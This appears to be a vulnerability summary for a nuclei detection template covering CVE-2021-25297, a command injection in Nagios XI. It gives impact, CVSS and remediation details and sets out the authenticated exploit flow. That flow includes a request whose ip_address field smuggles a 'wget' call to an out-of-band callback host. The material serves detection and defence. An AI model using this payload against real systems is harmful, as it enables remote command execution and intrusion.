---
cve_id: CVE-2021-25297
template_path: nuclei-templates/http/cves/2021/CVE-2021-25297.yaml
affected_product: Nagios XI
severity: high
authentication: required
external_callback: true
affected_versions: 5.5.6 through 5.7.5
preconditions: []
poc_classification: rce
---

## Vulnerability
Nagios XI 5.5.6 through 5.7.5 is susceptible to authenticated remote command injection. Improper sanitization of authenticated user-controlled input occurs via a single HTTP request to `/usr/local/nagiosxi/html/includes/configwizards/switch/switch.inc.php`. This leads to remote code execution, enabling execution of malware, sensitive information disclosure, data modification, and/or full system control.

**Impact:** Successful exploitation allows an authenticated attacker to execute arbitrary commands on the target system.

**Remediation:** Upgrade to a version higher than 5.7.5 or apply the provided patch.

**CVSS Metrics:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (score: 8.8)  
**CWE-ID:** CWE-78

## PoC / Detection
Classification: rce

The template performs a full authenticated exploitation flow:  
- GET `/nagiosxi/login.php` to extract NSP token via regex.  
- POST `/nagiosxi/login.php` with username/password and NSP to authenticate.  
- GET `/nagiosxi/index.php` to obtain authenticated NSP token.  
- GET `/nagiosxi/config/monitoringwizard.php?update=1&nsp=...&wizard=switch&ip_address=127.0.0.1"; wget {{interactsh-url}};` (20s timeout) to trigger command injection.  

Detection confirms via DNS interaction on the interactsh domain plus presence of both `<b>Ping</b>` and `Switch Details` in the final response body (status 200).

## References
- https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs/blob/main/README.md
- https://github.com/rapid7/metasploit-framework/pull/17494
- http://nagios.com
- https://nvd.nist.gov/vuln/detail/CVE-2021-25297
- http://packetstormsecurity.com/files/170924/Nagios-XI-5.7.5-Remote-Code-Execution.html
